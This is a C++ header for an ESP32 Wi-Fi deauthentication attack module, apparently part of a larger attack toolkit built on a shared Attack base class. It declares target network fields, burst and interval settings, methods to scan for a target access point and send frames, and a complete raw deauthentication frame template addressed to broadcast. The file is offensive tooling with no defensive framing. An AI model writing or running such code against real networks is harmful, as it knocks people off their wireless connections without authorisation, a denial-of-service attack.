/*
 * DeauthAttack.h
 * 
 * WiFi Deauthentication Attack module
 */

#ifndef DEAUTH_ATTACK_H
#define DEAUTH_ATTACK_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "esp_wifi_internal.h"
#include "Attack.h"

class DeauthAttack : public Attack {
  public:
    DeauthAttack();
    virtual ~DeauthAttack();
    
    // Override base class methods
    virtual bool start(unsigned long duration = DEFAULT_ATTACK_DURATION) override;
    virtual bool stop() override;
    virtual void update() override;
    virtual bool setParameter(const String& name, const String& value) override;
    virtual String getParameter(const String& name) const override;
    virtual String getAllParameters() const override;
    
  private:
    // Target network
    String targetSSID;
    uint8_t targetBSSID[6];
    uint8_t targetMAC[6];
    uint8_t channel;
    
    // Attack parameters
    bool attackAllClients;
    int framesPerBurst;
    unsigned long attackInterval;
    
    // State variables
    bool apFound;
    
    // Deauthentication frame template
    uint8_t deauthFrameTemplate[26] = {
      0xC0, 0x00,                         // Frame Control (Type: Management, Subtype: Deauthentication)
      0x00, 0x00,                         // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination address (broadcast)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source address (AP MAC)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
      0x00, 0x00,                         // Sequence number (will be filled by hardware)
      0x01, 0x00                          // Reason code (1 = Unspecified reason)
    };
    
    // Helper methods
    bool scanForTargetAP();
    void sendDeauthFrame(uint8_t* clientMAC, uint8_t* apMAC);
    void printMACAddress(const uint8_t* mac);
    bool macAddressFromString(const String& macStr, uint8_t* mac);
};

#endif // DEAUTH_ATTACK_H
